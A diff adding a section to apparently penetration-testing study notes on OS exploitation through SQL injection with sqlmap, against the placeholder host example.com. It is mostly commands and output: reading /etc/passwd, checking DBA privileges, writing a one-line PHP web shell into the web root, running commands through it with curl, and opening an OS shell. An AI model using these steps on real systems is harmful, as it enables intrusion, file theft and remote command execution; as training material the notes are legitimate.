@@ -573,3 +573,89 @@ You can use the `--all` and `--batch` switches together to automatically enumera
 
 ---
 
+# OS Exploitation Using SQLMap
+
+## File Read/Write
+
+### File Read
+The first part of OS Exploitation through an SQL Injection vulnerability is reading and writing data on the hosting server. Reading data is much more common than writing data.
+
+#### Example Command
+```sql
+LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
+```
+
+In MySQL, to read local files, the DB user must have the privilege to `LOAD DATA` and `INSERT`.
+
+### Checking for DBA Privileges
+To check whether we have DBA privileges with SQLMap, we can use the `--is-dba` option:
+```sh
+$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+```
+Output:
+```
+current user is DBA: False
+```
+
+If we do have DBA privileges:
+```sh
+$ sqlmap -u "http://www.example.com/?id=1" --is-dba
+```
+Output:
+```
+current user is DBA: True
+```
+
+### Reading Local Files
+SQLMap makes it easy to read local files with the `--file-read` option:
+```sh
+$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+```
+Output:
+```
+files saved to [1]:
+[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd
+```
+We can `cat` the local file to see its content:
+```sh
+$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
+```
+
+## Writing Local Files
+
+### Example PHP Web Shell
+Prepare a basic PHP web shell and write it into a `shell.php` file:
+```sh
+$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+### Writing to Remote Server
+Attempt to write this file on the remote server in the `/var/www/html/` directory:
+```sh
+$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+```
+Output:
+```
+the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
+```
+
+### Accessing the Remote PHP Shell
+Execute a sample command:
+```sh
+$ curl http://www.example.com/shell.php?cmd=ls+-la
+```
+
+## OS Command Execution
+Test SQLMap's ability to give an easy OS shell:
+```sh
+$ sqlmap -u "http://www.example.com/?id=1" --os-shell
+```
+If it fails, try specifying another technique like Error-based SQL Injection:
+```sh
+$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
+```
+Output:
+```
+os-shell> ls -la
+```
+
